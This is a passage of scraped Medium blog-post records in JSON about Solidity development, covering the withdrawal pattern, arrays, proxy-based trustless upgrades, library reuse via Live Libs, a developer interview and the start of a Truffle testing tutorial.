contract at a time almost always creates vulnerabilities.Withdrawal PatternAstute readers will have noticed that the subject of msg.sender\u2019s balance was rather glossed over. How does that work in practice?The first order of business is to create a data structure that will hold the balance for every possible user. Something like:mapping(address => uint) public balances;Great. As the funds arrive:balances[msg.sender] += msg.value;As the funds are returned:balances[msg.sender] -= amountToSend;Of course, you have to actually transfer funds and you have to make it re-entrance safe, so we will adjust the balance before we do the transfer. Altogether, something like:function withdrawFunds(uint amount) public returns(bool success) {       require(balances[msg.sender] >= amount; // guards up front    balances[msg.sender] -= amount;         // optimistic accounting    msg.sender.transfer(amount);            // transfer    return true;}RecapIt\u2019s not safe to talk to more than one untrusted contract at a time. The withdrawal pattern nicely avoids the necessity of doing so. Accounting will vary on a case-by-case basis. Suffice it to say that contracts should be aware of their liabilities to each account. For example, our crowdfunding contract would determine that the deadline has passed and the goal has not been reached, and therefore it should start allowing refunds.If we\u2019ve done the accounting, which we should, and if we\u2019ve given everyone a way to claim their funds, which we should, then there is often no need for the naive approach that tries to push transfers to other accounts. In essence, that is what developers mean when they say we should use a \u201cwithdrawal pattern\u201d or favoring \u201cpull\u201d over \u201cpush\u201d.Internalizing and practicing this approach habitually is an important aspect of the safe handling of funds in Solidity. As a reminder, production code candidates should always endure rigorous peer review. Problems might not be obvious. The withdrawal pattern is one way you can eliminate obvious vulnerabilities.Rob Hitchens is a Canadian smart contract design consultant, co-founder of Ethereum smart contract auditor Solidified.io and a courseware co-author and mentor of Ethereum, Hyperledger Fabric, Hyperledger Sawtooth Lake, Corda, Quorum and Tezos bootcamps by B9lab.\u2014 \u2014 \u2014If this has sparked your interest and you want to see more from B9lab why not look at our free Ethereum course. Or dive in to mentored learning with Rob as an expert instructor with the B9lab ONE subscription \u2014 access to all our online course for up to a year!Become a certified multi-framework developer with B9lab\u2019s one-on-one support and mentoring from expert instructors who will actually review your code and help you refine it.", "responses": 1, "tags": ["Ethereum", "Solidity", "Programming", "Smart Contracts"]}, {"title": "Syntax, Scams and Solidity: An Interview with Hans Svensson", "post_link": "https://blog.aeternity.com/syntax-scams-and-solidity-an-interview-with-hans-svensson-ef666fae2d58?source=search_post", "author_name": "\u00e6ternity", "author_link": "https://blog.aeternity.com/@aeternity_", "publish_date": "2019-01-10", "last_modified_date": "2019-01-11", "readtime": "3.20", "claps": 212, "voters": 11, "content": "Syntax, Scams and Solidity: An Interview with Hans SvenssonHans shared his view on functional programming, consensus, and whether or not blockchain will actually change the world.\u00e6ternityFollowJan 10 \u00b7 4 min readWith more than 15 years experience in Erlang programming, Hans Svensson in a specialist in model checking for concurrent programs. He has implemented CAN and LIN protocols and has worked as a QuickCheck expert, testing SSL, Riak, automotive protocols, telecom protocols and various other distributed systems. He has implemented the semantics of Erlang and knows the VM corners. As the author of multiple libraries with concurrency as the unifying theme, he holds a PhD in testing, model checking and verification of Erlang programs. Hans brings his laid back yet dedicated nature to the \u00e6ternity project and is known by many for his desire and ability to follow through. Recently, we sat down with him to ask about his view on functional programming, consensus, and whether or not blockchain will actually change the world.What brought you to the team?Coming from an academic background, having worked with distributed systems and having taught courses in cryptography, it was natural for me to have at least a brief interest in the emergence of blockchain technology. However, for several years I was too busy with work and family to explore it in detail.This changed when I was introduced to the \u00e6ternity project. It seemed like an amazing opportunity to build a next generation blockchain in Erlang.What interests you most about blockchain?I find the decentralized nature very interesting.I like the idea that the blockchain just exists; no one is \u201crunning it\u201d.Yes of course there is a community, and most changes it experiences include some version of consensus. But, at the end of the day, it is the code itself that a majority of the participants run that defines the chain.Do you think that blockchain has the potential to change the world?This is a question that I often get from friends when they hear that I am currently involved in a blockchain project. I usually tell them that I think a few \u2014 maybe a handful \u2014 of the existing blockchains will persist and be really useful building blocks in future technology. However, I am not so sure it will, in itself, change the world. In a sense, it might do so because it enables some groundbreaking service to be built upon it. But how this might happen remains to be seen.What is your favorite thing about Erlang as a programming language?I can only pick one? For me, it has to be its modern and succinct syntax\u2026 Just kidding! But seriously, apart from its unrivaled concurrency model, what I normally fancy most is that I can be really productive. The language being functional and dynamically typed also helps a lot. Having written lengthy imperative programs and battled the Haskell type-checker, this feature is very valuable to me.What is the biggest challenge of your work at the moment?The biggest challenge for \u00e6ternity is uptake. Sure, we can develop and improve lots of things. But we need to educate people and get them to understand, and love, the concepts that we already have. Our contract language is an excellent example of this. It is different compared to Solidity for instance. But it is different for a reason and, if you ask me, it is different in a very good way. There is much less chance to shoot yourself in the foot with Sophia, but you can still do it if you really want to.In the end I like that we have made a safer language without limiting its expressiveness!What advice would you give someone about this technology?This business is full of paranoid people: people who are very quick to call something a scam as soon as they see anything that they don\u2019t fully understand. Probably for good reasons, there have already been too many dodgy projects around. But my advice would be to take three deep breaths, make sure you understand what you are looking at, and make your own decisions about things.Outside of work, how might a friend describe your personality?Some friends would say I care a bit too much about football, but it is nice to have something non-technical to focus on from time to time. ;)Interested in \u00e6ternity? Get in touch:GitHub | Forum | Reddit | Bitcointalk | Telegram | Twitter | Facebook | Mail", "responses": 0, "tags": ["Aeternity", "Blockchain", "Team", "Erlang", "Interview"]}, {"title": "Arrays in Solidity", "post_link": "https://blog.aventus.io/arrays-in-solidity-788350f55ce5?source=search_post", "author_name": "Aventus Network", "author_link": "https://blog.aventus.io/@aventus", "publish_date": "2018-07-20", "last_modified_date": "2018-07-23", "readtime": "5.45", "claps": 209, "voters": 10, "content": "Arrays in SolidityAventus NetworkFollowJul 20, 2018 \u00b7 6 min readThis is the second technical blog on Solidity from Alex Pinto, a recent addition to our blockchain engineering team. You can read his first post on Working with Strings in Solidity.There are many occasions when we want to pass to a function a group of similar data that may, or may not, be limited in number. The most basic data type for this situation is an array (and in several cases, this can be used to implement more advanced data structures). We can pass and return arrays without problems, as the following illustrates.The above uses arrays of uint, which represents a 256-bit integer, of unlimited size. That means I can pass any array of the correct type into the function. It also means I have to initialise the return array in getArrayMultipliedByScalar before I can use it, since at the time outArray_ is declared it does not allocate any memory for its elements (it could have any size).For comparison; if I used fixed-size arrays, as below, two things happen:I no longer need to initialise the outgoing array.The compiler returns an error if the function receives an array with any other size but 3.We can make arrays of other types, like bool and address - but what about multi-dimensional arrays?We can pass bi-dimensional arrays of fixed size:Sadly, things are more difficult with dynamic arrays.Some languages, like BASIC and Pascal, index bi-dimensional arrays by a tuple of indices. In these languages, arrays are genuine (rectangular) matrices. But in C-derived languages, multi-dimensional arrays are arrays-of-arrays, instead of matrices. That is the case with Solidity as well, and it pays to take some time to understand what this type declaration means: uint[2][4] should be read as (uint[2])[4], that is, 4 arrays each of size 2.This is important when we consider dynamic arrays. We could have both of these kinds:The first example above is a fixed-size array which has 3 elements, each of which is a dynamic array. In the second case, we have a dynamic array outright, but its elements are arrays of fixed size.I discuss below how to initialise fixedSizeArray, which is the most interesting case of the two. Regarding dynamicArray, because it is a dynamic array, we first must allocate memory for it using new and then we can access the fixed-size elements. The example below works:Initialisation of multi-dimensional dynamic arraysLet\u2019s explore an example similar to the above in more detail:TypeError: Type uint256[3] memory is not implicitly convertible to expected type uint256[3] storage pointer.The arrays fixedSizeArray and dynamicArray are declared as state variables of the contract, and so are by necessity storage references. Storage arrays can not be initialised from newexpressions, as these are of type memory. Nevertheless, we can initialise each of the arrays inside fixedSizeArray using memory-array expressions, as shown above.For comparison, I included also two cases where I try to assign a memory array to an explicit storage one. In the constructor, this works, but not in the second function. Why?This is because the types of storageArray and of localStorageArray are not exactly the same. The former is a state variable of the contract, and when it is referred inside the constructor, its type is uint256[3] storage ref (to see this, change the assignment\u2019s right value to something illegal, such as 7, and the error message will show you the types involved). In comparison, the type of localStorageArray is uint256[3] storage pointer. Subtle difference. In the first case, we have a reference to a location in storage, and the assignment copies the memory array to that storage. In the second case, we try to assign to a local variable which according to the documentation just creates a new reference to a previous pointer:Assignments to local storage variables only assign a reference though, and this reference always points to the state variable even if the latter is changed in the meantime.Excerpt from Solidity documentationIn the above example, y is a pointer to the same location known as x, and modifying one causes changes in the other. But in our case, we are trying to assign a memory array to a storage variable which, being of a different type, cannot produce a pointer to that memory location.On the other hand, when we initialise fixedSizeArray, we are actually referring to a storage reference. In this case we can assign from a memory array, which has the effect of completely copying the source over the target, erasing all of its previous contents.Can we pass multi-dimensional arrays to functions?It depends!We can use Solidity\u2019s polymorphism to write four functions with the same name, and different signatures, exploring all combinations of dynamic and fixed-size bi-dimensional arrays.Two of these functions are illegal, only because their particular array type cannot be passed to a function. Illegal is a bit of a strong word: the error says the type can be used, but only with the new experimental ABI encoder; and that in order to use it, it is necessary to include pragma experimental ABIEncoderV2;. However, we then would get a warning saying that it should not be used in production code.This restriction will likely be waived in the future, as new versions of Solidity come along, but for now, I just won\u2019t use these features and will look for workarounds.The common feature between these two types is that the inner type of the array - that is the type of its elements - is dynamic, of unknown size. These types cannot be passed into nor returned from a function.I will finalise this post with another example:The last two functions are illegal. The reason why is very consistent with everything that has been said before: string and bytes are dynamic types. Specifically, they are arrays: respectively, of UTF-8 characters, and of bytes. For that reason, the above return types are not really simple uni-dimensional arrays like those of getInts and getAddresses, but are instead bi-dimensional arrays with a dynamic inner type. And because of that, they cannot be passed into nor returned from functions at the current stage of Solidity.About the AuthorAlex is a software engineer at Aventus, working on the blockchain engineering team. He has 20 years of experience working in technology, completing a PhD in Computer Science as well as a post-doctorate in Cryptography. As part of his research, Alex has published papers on Kolmogorov Complexity, Cryptography, Database Anonymization and Code Obfuscation.Alex also spent seven years lecturing at the University Institute of Maia, including directing the degree programmes for BSc Computer Science and Information Systems and Software.", "responses": 0, "tags": ["Programming", "Solidity", "Coding", "Ethereum", "Blockchain"]}, {"title": "Creator of Solidity joins Slock.it Team as Advisor", "post_link": "https://blog.slock.it/creator-of-solidity-joins-slock-it-team-as-advisor-76b77d0aa459?source=search_post", "author_name": "Stephan Tual", "author_link": "https://blog.slock.it/@stephantual", "publish_date": "2015-12-15", "last_modified_date": "2018-05-16", "readtime": "0.83", "claps": 9, "voters": 10, "content": "Creator of Solidity joins Slock.it Team as AdvisorStephan TualFollowDec 15, 2015 \u00b7 1 min readWe\u2019re delighted to announce that Dr. Christian Reitwie\u00dfner, the creator of the Ethereum smart contract language Solidity, is joining the Slock.it team as Advisor.Solidity is a high-level language with a syntax similar to that of JavaScript and is designed to compile to code for the Ethereum Virtual Machine. It\u2019s at the core of every Dapp, and makes it easy to create contracts for voting, crowdfunding, gaming, blind auctions, multi-signature wallets and more.Christian has a PhD in Computational Complexity Theory (don\u2019t worry, I had to look that one up, too) and is passionate about the power of cryptography.Prior to joining Ethereum, Christian worked for Tom Tom leading a team responsible for analysing road traffic data and taking it into account in routing algorithms on personal navigation devices.Christian shares our keen enthusiasm for open source software being made available to everyone \u2014 a fundamental pillar of the work we do here at Slock.it.Welcome, Christian!", "responses": 0, "tags": ["Blockchain", "Ethereum", "IoT"]}, {"title": "", "post_link": "https://medium.com/@davekaj/if-you-want-to-learn-about-smart-contract-technologies-you-should-focus-on-ethereum-and-solidity-ef98de784919?source=search_post", "author_name": "Dave Kajpust", "author_link": "https://medium.com/@davekaj", "publish_date": "2018-03-01", "last_modified_date": "2018-04-15", "readtime": "0.30", "claps": 71, "voters": 10, "content": "Hi Dave,1Abhin K RajDave KajpustFollowMar 1, 2018 \u00b7 1 min readIf you want to learn about smart contract technologies, you should focus on ethereum and Solidity. Solidity has great documentation. Use https://remix.ethereum.org/ to quickly test solidity code in a browser IDE.Then, once you get the hang of smart contracts, start developing dApps with the truffle suite http://truffleframework.com/ . They are making it amazingly simple to develop dApps on ethereum. Compared to a year ago, it is so much easier to be a developer of smart contracts with the truffle framework.", "responses": 0, "tags": []}, {"title": "Trustless Upgrades in Solidity", "post_link": "https://medium.com/hackernoon/trustless-upgrades-in-solidity-bf0bd4047d28?source=search_post", "author_name": "Rob Hitchens", "author_link": "https://medium.com/@robhitchens", "publish_date": "2019-06-03", "last_modified_date": "2019-06-08", "readtime": "9.90", "claps": 24, "voters": 9, "content": "Trustless Upgrades in SolidityUpgradability is not always a Bug.Rob HitchensFollowJun 3 \u00b7 10 min readRob Hitchens and Ali AzamPhoto by James Hammond on UnsplashA few weeks ago, we published Selfdestruct is a Bug, itself inspired by Upgradeability is a Bug by Steve Marx of Consensys Diligence. The gist of both pieces is that changing contracts undermines immutability. One might well ask \u2014 what is so special about blockchain if the code can be changed at the whim of a privileged user?If You Aren\u2019t Losing Sleep, You Might be Doing it WrongEthereum Dapp Developers have to deal with an unfamiliar paradigm (blockchain) and an unfamiliar language (Solidity) to create unfamiliar solutions (governance, assets, rights) to unfamiliar problems (game theory, business process re-engineering, marketplaces, and more). It\u2019s of little wonder that upgradability is a welcomed possibility.Upgradable Contracts To the Rescue!In 2016, Coloney published Writing Upgradable Contracts in Solidity. The gist of their \u201cEternal Storage\u201d pattern is\u2026 isolate your datastore from the rest of your code, and make it as flexible as possible, so that it is unlikely to need to be upgraded.At the risk of grossly over-simplifying, you can have a data storage contractthat is so simple, so flexible and so well-solved that you can be confident that it won\u2019t ever need revision. At least, that\u2019s the idea. For example, you might settle on a key/value store and then stop.Consider something simple:contract EternalStorage is Ownable {   mapping(bytes32 => uint) UIntStorage;  function setUintValue(bytes32 record, uint value) public {     UintStorage[record] = value;  }  function getUIntValue(bytes32 record) constant returns (uint){    return UIntStorage[record];   }}  // the endSurely, we can QA something like that and call it a win. We might congratulate ourselves about how that much, at least, should work forever.Another contract, the logic contract, owns the storage. Ownership is transferable to another logic contract. This structure offers the possibility of swapping the old logic contract for a new one. Et Voila! Subject to getting that data layer right, you can have an upgradable system of contracts. Have a look at RocketPool for an example of a project that pursued this approach in a system with multiple contracts.A frequent criticism of this approach is the complexity that bubbles up to the logic level. Everything persistent needs to be described in a way the storage contract will understand. That can, and does, add complexity and diminish readability because reducing all variable names, arrays and mapped elements to unique keys for a key/value store adds extra steps in the contracts that store everything this way.For example, you don\u2019t get to say:counter++You might have to say:counter = datastore.get(keyForCounter);datastore.set(keyForCounter, counter++);Not horrible, but visual noise adds up.DelegateCall, Libraries and Proxy PatternsWith the Homestead hard fork, the EVM picked up an OPCODE called DELEGATECALL. As the name suggests, a contract will \u201cdelegate\u201d a function to another contract. The Solidity team added librarythat uses it.A librarylooks a lot like a contract but with a possibly strange-seeming limitation. They can\u2019t hold any data. That\u2019s because they run in the context of the contract that decided to DELEGATECALL. So, if contract I decides to DELEGATECALL to a library function called makeBed, then it is I\u2019s bed (mine) that gets made, not that of the library. If I want to upgrade the makeBed process, I need a new library and I need the contract to start delegating calls to the new library.You can have a main contract that delegates everything important to one or more libraries.pragma solidity 0.5.1;library DoStuff {        struct DataStore {        mapping(bytes32 => uint) value;    }        function setVal(DataStore storage self, bytes32 key, uint value)        internal     {        self.value[key]= value;    }        function getVal(DataStore storage self, bytes32 key)         internal view returns(uint)     {        return self.value[key];    }}contract Switchboard {        using DoStuff for DoStuff.DataStore;    DoStuff.DataStore data;        function set(bytes32 key, uint value) public {        data.setVal(key,value);    }        function get(bytes32 key) public view returns(uint) {        return data.getVal(key);    }    }This isn\u2019t a complete tutorial about libraries,but here are some quick takeaways:The actual values are stored in the SwitchBoard, but the library defines the layout of the data types it understands.A storage pointer gives the library something to work with. Thelibrary writes directly to Switchboard's storage. You might say, Switchboard authorized it to do that when it passed a storage pointer.There is syntax sugar in play, and that\u2019s why a) there seems to be a missing argument (count them) and b) the library functions are magically invoked as methods for data that was defined as an instance of the struct (layout only) in the library.The contract functions are deliberately simple. They just take the inputs and pass it through to a library that should know what it\u2019s doing.A nice thing about libraries is that once you catch on to the overall idea, they don\u2019t call for too much adjustment to familiar contract coding styles. In summary, we have a library that will \u201cdo stuff\u201d to any appropriately laid out DataStore you throw at it.Functions Need Upgrades, TooFor brevity, let us set aside the mechanism that will allow us to swap in a new library and just accept that can be done with a little more effort. We won\u2019t dwell on this because there is a bigger problem. What if we want to add a function that the SwitchBoard doesn\u2019t do? What if we want to add an argument that one of the existing functions doesn\u2019t accept?It\u2019s not entirely reasonable to assume that the function signatures can be worked out for all time, in advance. The future is unknowable and this is, in part, why we might be interested in upgradable contracts.A \u201cProxy\u201d contract can solve for a flexible interface by forwarding anything to an implementation contract, and returning anything that comes back. Assembly is, by its nature, a little down in the weeds for my taste but this assembly code has been in existence for a few years now. It is a very popular and well-known pattern.function () external payable {  assembly {    let ptr := mload(0x40)    calldatacopy(ptr, 0, calldatasize)    let result := delegatecall(      gas,       implementationAddress,       ptr, calldatasize, 0, 0)    let size := returndatasize    returndatacopy(ptr, 0, size)    switch result    case 0 { revert(ptr, size) }    default { return(ptr, size) }  }}First, it\u2019s a fallback function, so it runs when the Proxy contract can\u2019t find a match. It\u2019s payable because it should support payable implementation function, to be useful.It copies the incoming calldata and passes it to delegatecall which sends it on to an implementationAddress that, hopefully, knows what to do. implementationAddress is a contract address we will, for now, presume was set up in advance.Maybe the implementationAddress doesn\u2019t know what to do, or maybe it reverts. delegatecall would return 0/false in that case, so this implementation checks that and reverts if the implementationAddress wants to revertThe function returns the implementationAddress response if the operation was a success. It has no idea what the inputs or outputs mean but you can use the ABI of the implementation contract at the address of the Proxy contract. This slight of hand creates a convincing illusion of working directly with the implementation contract when, in fact, one is channeling everything through the Proxy.One of the very nice features of this pattern is that the implementationAddress is a contract that doesn\u2019t necessarily know it\u2019s upgradable. It has state variables laid out in the usual way, using the usual syntax, but, in fact, everything is written to the Proxy contract's state.This is so popular, in fact, that Zeppelin use it as the basis for ZeppelinOS\u2019s Transparent Proxy. You will also find it in Gnosis Safe.One of the big caution items you will discover is the very realistic possibility of overwriting important state data if a replacement implementation is defective or nefarious. It is important to establish a framework and/or practices that ensure that such an accident isn\u2019t possible.Even if everything works as expected, it does not seem to address an important concern that arises from upgradability itself. Let us return to the higher-order concern, that upgradability itself diminishes immutability. Let us consider what we might do to mitigate this concern.When is Upgradability NOT a Bug?In this overview we\u2019ve touched on Eternal Storage, Switchboards and Transparent Proxy patterns, any one of which might be of interest if you care to dig in and research more about how.You will still arrive at a troubling question. Why should anyone trust your contract if it\u2019s upgradable?After all, isn\u2019t the whole point of this form of software about creating certainty? What happens to certainty if a privileged user can change the implementation? It disappears. You might as well write the software in your favorite language, deploy it on your favorite platform and use traditional measures to convince your users that you, yourself, won\u2019t do anything that disadvantages them. Odds are you will save yourself a lot of trouble.I first heard of Ali Azam\u2019s approach to this problem from his presentation at DevCon IV. His approach is to require the consent of the users. Not all of the users, mind you. Not a democratic process that could leave a minority of users forced to accept an upgrade they do not want.Each and every single user should decide, for themselves, if they want to continue with the contract they already signed up for, or migrate voluntarily to a new version.The RegistryThis is a more granular upgrade process with each user potentially using their favorite implementation contract. The Registry contract is tasked with recording the available implementation contracts, and each user\u2019s preferred implementation.This setup looks something like this:mapping(address => address) userImplementationChoices;The Transparent Proxy introduced earlier accommodates that by looking up the user\u2019s preferred implementation and then carrying on with the Proxy mechanics as described earlier:address implementationAddress = userImplementation(msg.sender);The function userImplementation(address) works out a few details and returns an implementation contract address, for the user. It is the user that decides if they want to select a certain implementation or opt-in to push updates.Trustless Upgrade means the user decides.Astute readers might realize that different backing contracts could imply the need for different client-side components such as the UI. Yes, indeed, and the way to find out which ABI is in play is to ask the Registry.function userImplementation(address user) public view returns(address) {More Decentralized, By DesignIt would probably be madness to let everyone use any contract they like, especially when they share communal storage in a system. No, we want to limit this to valid the choices the developers and QA professionals agree are compatible.The Registry allows a privileged user to approve a new contract that users can choose, if they want to. The \u201cprivileged user\u201d can be a governance contract wherein users deliberate about applicants that should even be admitted.The flow can easily accommodate unambiguous proposals and approvals.Someone deploys a new implementation.Someone proposes that the contract at 0x123... should be added to Registry\u2019s list of valid implementations.Decision, add to Registry with:function addImplementation(address implementationAddress)   public   onlyOwner Importantly, no one can be forced to move away from the original contract, as it was, when they signed up. And, the users don\u2019t have to trust that the upgradability feature won\u2019t be used to their disadvantage. It is designed to facilitate the opposite of that \u2014 a transparent process where review of the code and public deliberations are the norm and there is no possibility of sidestepping the agreed governance policy.Default Implementation and Other Administrative ConcernsWith the basic principle of operation out of the way, the remaining concerns are largely administrative. Users can either:Opt in, and accept new versions as they appear, orOpt out, and accept no new versions unless they manually change their preference.The default choice of all new users (opt-in or opt-out) is a Registry setting that cannot be amended post-deployment, because changing the users\u2019 understanding of the choices they have and the processes they can depend upon would be a bug.An Emergency Recall function allows the privileged user to deprecate a release. This will migrate affected users, only those who were using the deprecated release, to another recommended choice. The privileged user controls the suggested version, known as the default implementation. Recall is the only case where users can be forcibly migrated to something else. An alternative approach would be to simply disable implementation for the affected users until they explicitly choose another version. We have designed this in the interest of user experience, with the expectation that governance would prevent a nefarious implementation from even making it to the list.Version Style GuideThe module includes an inheritable contract that addresses a security concern, namely that no one should invoke an implementation contract directly (i.e. without going through the Proxy). That would make no sense because the data resides in the Proxy, not the implementations. A modifier, onlyProxy blocks that inappropriate invocation.As a general rule, subsequent versions of an implementation should inherit from previous implementations. Doing so ensures the state layout always evolves in an additive way. Overriding functions is acceptable. Adding new functions and new arguments is acceptable. Disabling functions is acceptable (override with revert(\"deprecated\");).The sample implementation includes a Hello World contract and a second version called HelloUniverse. The concerns described above are all addressed with minimal intrusiveness:contract HelloWorld is Upgradable {  function doSomething() ... onlyProxy ...{    ...contract HelloUniverse is HelloWorld {  ...That\u2019s it.Wait. There is one other thing. The registry uses an arbitrary bytes32 called \u201ccomponentId\u201d. This will be generated when a Proxy is deployed, which itself deploys a corresponding Registry (One Registry per Proxy and one Proxy per upgradable contract).componentIdis easily inspected with Registry.componentId() and it\u2019s value must be passed into each upgradable contract. For example, in Hello World:constructor(bytes32 componentUid) Upgradable(componentUid) public {This facilitates a rudimentary check to help catch deployment-time errors such as putting implementations of the wrong component into a Registry, in production. The Registry will reject implementation contracts that don\u2019t claim to implement the expected component.VariantsThe example code approaches implementation as a user-by-user concern. The idea of a context-aware Proxy can be applied in other ways. For example, consider off-chain data and on-chain validation contracts. It would be possible to use an upgradable validation contract that gets a signal from off-chain assets \u2014 A doc that says, approximately, use validation version 3.2 to parse me.The codeThe experimental repo, https://github.com/rob-Hitchens/TrustlessUpgrades may, from time to time, be a few commits ahead of the community repo, https://github.com/ali2251/Upgradable-contractsAli\u2019s Trustless Upgrades documentation and workshop handouts are available online at https://docs.upgradablecontracts.com/.Rob Hitchens is a Canadian smart contract design consultant, co-founder of Ethereum smart contract auditor Solidified.io and a courseware co-author and mentor of Ethereum, Hyperledger Fabric, Hyperledger Sawtooth Lake, Corda, Quorum and Tezos bootcamps by B9lab.Ali Azam is a senior Blockchain Developer at Vaultplatform, previously worked at King\u2019s College London for over two years and has presented various workshops and keynotes at King\u2019s College London, Devcon4, Blockercon and many other places. Ali is a senior mentor and a core member at Work on Blockchain monthly blockchain developer bootcamp and leads Smart Contract Upgradability Workshop held in London.", "responses": 1, "tags": ["Ethereum", "Solidity", "Blockchain", "Programming", "Smart Contracts"]}, {"title": "Exploring Code Reuse in Solidity", "post_link": "https://media.consensys.net/exploring-code-reuse-in-solidity-6971e76dc247?source=search_post", "author_name": "ConsenSys", "author_link": "https://media.consensys.net/@ConsenSys", "publish_date": "2016-06-08", "last_modified_date": "2019-05-22", "readtime": "4.98", "claps": 30, "voters": 6, "content": "Exploring Code Reuse in SolidityConsenSysFollowJun 8, 2016 \u00b7 5 min readMy first impression of Solidity, the most popular programming language that runs on Ethereum\u2019s virtual machine, was that the language was quite approachable. As someone who has been working with languages like Ruby, JavaScript, Perl, and Java for 16 years, I was able read it immediately and started writing some basic smart contracts within a few days.I\u2019ve been around long enough to witness several programming language ecosystems mature. Code reuse tends to be at the center of this maturity, as the community builds increasingly powerful code libraries and frameworks on top of previous work. Perl has CPAN, Ruby has RubyGems, and Javascript has npm. It\u2019s clear that code reuse in the Solidity ecosystem is still in its infancy.Recognizing this void, my first month at ConsenSys I focused on filling it. I\u2019m assuming that Solidity will follow in the footsteps of its modern predecessors and benefit significantly from the distribution of foundational libraries and frameworks. I started with an exploration into where Solidity reuse is already underway.There\u2019s a precursor to a Solidity Standard Library that already ships with the language (source). These contracts allow developers to inherit from owned and mortal without having to reinvent these common smart contract patterns.There is a smattering of reusable libraries and contracts on Github, which developers can copy into their projects and deploy alongside their custom contracts. dapp-bin, Density, solidity-stringutils, and Standard Contracts are examples.On the topic of Github, it\u2019s possible to import code directly from Github in ethereum.github.io/browser-solidity like this: import \u201cgithub.com/ethereum/dapp-bin/library/iterable_mapping.sol\u201d;And if you want to pull in code from Github when compiling via solc on the command line, that\u2019s explained here.The people behind Dapple have created the dapphub-registry of contracts, which can be imported into Dapple projects. This is an ambitious project and includes storing source code via IPFS. The home page (under construction) is at dapphub.io.After speaking with friends and colleagues at ConsenSys and in the Ethereum community, I was convinced that facilitating code reuse in Solidity was a worthy project. I fully anticipate that other reuse-related projects will be on the rise this year, and I look forward to lots of collaboration.Being new to Ethereum, my instincts led me to focus on the smallest possible unit of reuse: the humble Solidity library. In Solidity, a library is a collection of functions that do not maintain any inherent state. Libraries are meant to be imported into a contract\u2019s bytecode, rather than provided to a contract via a constructor or a method call.Let\u2019s look at an example of a contract using a library:library Math {   function add(uint a, uint b) constant returns(uint) {       return a + b;   }}contract Example {   uint public c;function grow(uint d) {       c = Math.add(d, 2*c);   }}This syntax is straightforward. Math 's functions are called directly rather than through an instance of Math . If we were in Java, this would be a static method. In Ruby, a class method.Deploying this is a little less straightforward. First, you must compile and deploy Math, storing its address. Then we must compile Example and link Math's address into Example's bytecode. Thankfully solc does this for us via the --libraries  and --links flags (docs).As I learned the basics of how libraries work, it struck me that reusing Solidity libraries (and possibly contracts) could be quite different than reusing code in other languages. Once a Solidity library is deployed to the blockchain, it can be used by anyone, assuming you know its address and ABI. It occurred to me that a good first step toward spreading reuse in Solidity could be to provide a registry that mapped library names to the data needed to compile and link to those libraries, specifically their addresses and ABIs.Thus, the Live Libs project was born. Live Libs is a command line and JavaScript interface to a smart contract which stores a registry of libraries. Live Libs provides all the data you need in order to reuse a registered library, including the generated source code to compile against. Let's take that example again, but this time, instead of writing Math  ourselves, we'll use Live Libs to get a registered version of Math.import \"Math\";contract Example {   uint public c;function grow(uint d) {       c = Math.add(d, 2*c);   }}Looks simple, right? Well, it's not.That import \"Math\"  has a big question mark behind it. Another current area of active development in Solidity is how to hook into the import process in order to resolve these statements dynamically.Let's assume that someone has written a JavaScript wrapper around solc to intercept that import \"Math\"  and delegate the definition to Live Libs. Behind the scenes, you would call var libInfo = liveLibs.get(\"Math\") , which would provide you with two key items: libInfo.address  and libInfo.abstractSource() . You would provide the address, along with \"Math\"  to the compiler via --libraries --link , in order to tell Example  where Math  lives on the blockchain. But first, you would provide the generated abstract source code to the compiler so that Example would compile. Live Libs generates this code from the ABI that was stored when Math was registered. To be clear, that generated source is an abstract library:library Math {   function add(uint a, uint b) constant returns(uint);}The above example demonstrates the core of what Live Libs is trying to accomplish technically.The project is premised on the assumption that the Ethereum developer community is open to this style of reuse. Live Libs aims to keep common code from being unnecessarily duplicated on the blockchain. Most developers are accustomed to downloading modules to their local environments and then uploading those modules to private servers, effectively copying common modules (like Math ) thousands of times over. Developers who use the public Ethereum blockchain are all deploying to the same \"world computer\" running on the same virtual machine. These deployments have direct costs (spending Ether on gas), so there's incentive to keep deployments lean. Ethereum\u2019s unique characteristics thus present us with some unique opportunities.If you have thoughts or reactions to this post, please start conversations via issues!The Live Libs project is exploring:Building out a website to expose library information, blockchain events, documentation, and support testing. (project)Whether the Ethereum community would fund library development via Vitalik\u2019s article ransom (see 2:30) technique. The first version of this is documented here.Storing libraries that are written in Serpent in Live Libs.How this approach is affected by a sharded blockchain.", "responses": 0, "tags": ["Features", "Technical", "Technical Guide"]}, {"title": "Solidity CRUD Tutorial, Part 2 \u2014 Testing Your Smart Contract with Truffle", "post_link": "https://medium.com/crowdbotics/solidity-crud-tutorial-part-2-testing-your-smart-contract-with-truffle-3866f3ce2c66?source=search_post", "author_name": "Gaurav Agrawal", "author_link": "https://medium.com/@gaurav.agrawal", "publish_date": "2018-10-09", "last_modified_date": "2019-06-12", "readtime": "4.57", "claps": 26, "voters": 6, "content": "Solidity CRUD Tutorial, Part 2 \u2014 Testing Your Smart Contract with TruffleTesting a Solidity smart contract using Truffle frameworkGaurav AgrawalFollowOct 9, 2018 \u00b7 5 min readIn the last tutorial, we have created a smart contract which performs some basic CRUD (create, read, update, delete) operation, let\u2019s test that smart contract using Truffle.Truffle \u2014 Truffle is the most popular development and testing framework for developing ethereum smart contracts.Installing TrufflePrerequisitesNodeJSNode Package Manager (NPM)InstallationFirst, we need to install the Truffle packagesudo npm install -g truffleVerify that it has been downloaded successfully by runningtruffleChoose a directory and runtruffle initIt will create a directory structure and create few files.Let\u2019s go to these directories one by one an will understand what they are.contracts/: Directory for Solidity contractsmigrations/: Directory for scriptable deployment filestest/: Directory for test files for testing your application and contractstruffle.js: Truffle configuration fileWe will use truffle develop to test our smart contract. Truffle gives us inbuilt development blockchain with ethereum accounts.Let\u2019s create a file with CrudApp.sol (Notice, same name as our contract name) under contracts directory and paste our smart contract code.Let\u2019s compile our smart contract using,truffle compileIt may show some warnings but let\u2019s ignore them for now. Open our development console using,truffle developIt will show an output something like below:Truffle Develop started at http://127.0.0.1:9545/Accounts:(0) 0x627306090abab3a6e1400e9345bc60c78a8bef57(1) 0xf17f52151ebef6c7334fad080c5704d77216b732(2) 0xc5fdf4076b8f3a5357c5e395ab970b5b54098fef(3) 0x821aea9a577a9b44299b9c15c88cf3087f3b5544(4) 0x0d1d4e623d10f9fba5db95830f7d3839406c6af2(5) 0x2932b7a2355d6fecc4b5c0b6bd44cc31df247a2e(6) 0x2191ef87e392377ec08e7c08eb105ef5448eced5(7) 0x0f4f2ac550a1b4e2280d04c21cea7ebd822934b5(8) 0x6330a553fc93768f612722bb8c2ec78ac90b3bbc(9) 